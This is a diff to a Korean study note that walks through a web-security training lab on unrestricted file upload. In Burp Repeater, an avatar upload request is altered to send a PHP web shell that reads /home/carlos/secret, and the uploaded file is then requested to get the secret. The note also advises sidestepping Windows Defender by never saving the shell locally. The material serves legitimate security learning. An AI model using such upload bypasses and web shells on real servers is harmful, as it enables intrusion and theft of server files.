@@ -102,19 +102,58 @@ ExifTool 같은 도구로 유효한 JPEG 형식을 유지하면서
 ### 목표
 PHP 웹쉘을 업로드해서 서버의 `/home/carlos/secret` 파일 내용 읽기
 
-### 풀이 흐름
-1. 프로필 이미지 업로드 기능 발견
-2. 아래 내용으로 `webshell.php` 파일 생성:
-   ```php
-   <?php echo file_get_contents('/home/carlos/secret'); ?>
+### 사용 도구
+- **Burp Suite Proxy**: 업로드 요청 가로채기
+- **Burp Suite Repeater**: 요청 내용 수동 수정 후 전송
+
+> ⚠️ webshell.php를 로컬에 저장하면 Windows Defender가 탐지함
+> Burp Repeater에서 직접 수정하는 방식으로 로컬 파일 생성 없이 진행
+
+### 풀이 순서
+
+**1단계 — 로그인**
+- `wiener` / `peter` 로 로그인
+
+**2단계 — 이미지 업로드 요청 캡처**
+1. **Intercept is on** 상태로 전환
+2. 프로필 페이지에서 아무 이미지(.jpg/.png) 업로드
+3. Burp에 요청이 잡힘 — 아래 구조로 되어 있음:
    ```
-3. 이미지 업로드 폼에서 `webshell.php` 업로드
-4. 업로드된 파일 경로로 직접 GET 요청
+   POST /my-account/avatar HTTP/2
+   Content-Type: multipart/form-data; boundary=----WebKitFormBoundary...
+
+   ------WebKitFormBoundary...
+   Content-Disposition: form-data; name="avatar"; filename="사진.png"
+   Content-Type: image/png
+
+   PNG...（이미지 바이너리 데이터）
    ```
-   GET /files/avatars/webshell.php
+
+**3단계 — Repeater에서 요청 수정**
+1. 요청에서 우클릭 → **Send to Repeater**
+2. **Forward** 눌러서 원래 요청 보내기
+3. Repeater 탭으로 이동 후 세 곳 수정:
+   - `filename="사진.png"` → `filename="webshell.php"`
+   - `Content-Type: image/png` → `Content-Type: application/octet-stream`
+   - 이미지 바이너리 데이터 전체 삭제 후 아래 코드로 교체:
+     ```
+     <?php echo file_get_contents('/home/carlos/secret'); ?>
+     ```
+4. **Send** 클릭
+5. 응답에 `The file avatars/webshell.php has been uploaded.` 확인
+
+**4단계 — 웹쉘 실행**
+1. Burp 브라우저에서 아래 URL 접속:
    ```
-5. 응답에서 secret 값 획득
+   https://[랩ID].web-security-academy.net/files/avatars/webshell.php
+   ```
+2. 페이지에 secret 값 출력됨
+
+**5단계 — 정답 제출**
+- 랩 페이지에서 **Submit solution** → secret 값 입력 → 클리어
 
 ### 핵심 포인트
-- 서버가 파일 타입을 전혀 검증하지 않는 가장 기본적인 케이스
-- 업로드 디렉토리에서 PHP 실행이 허용되어 있는 상황
+- 서버가 확장자, 내용, Content-Type 아무것도 검증하지 않음 → PHP 파일 그대로 업로드
+- PHP 파일은 서버에서 코드로 실행됨 → 서버 파일 읽기 가능
+- Repeater = 요청을 직접 수정해서 수동으로 테스트하는 기능
+- Content-Type 헤더는 브라우저가 보내는 값 → Burp로 마음대로 조작 가능
